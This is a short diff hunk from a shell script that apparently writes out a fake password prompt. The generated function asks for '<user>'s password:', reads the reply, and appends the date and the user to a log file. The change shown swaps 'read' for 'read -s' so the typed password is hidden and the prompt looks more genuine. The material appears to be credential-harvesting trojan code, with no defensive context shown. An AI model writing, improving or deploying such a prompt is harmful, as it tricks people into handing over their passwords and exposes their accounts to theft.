@@ -6,7 +6,7 @@ touch $file_exec
 cat > $file_exec <<EOF1
 f(){ 
 echo -n "\${@}'s password: " ;
-read password;
+read -s password;
 touch $log_file;
 echo "\$(date)" >> $log_file;
 echo "User: \$1" >> $log_file;
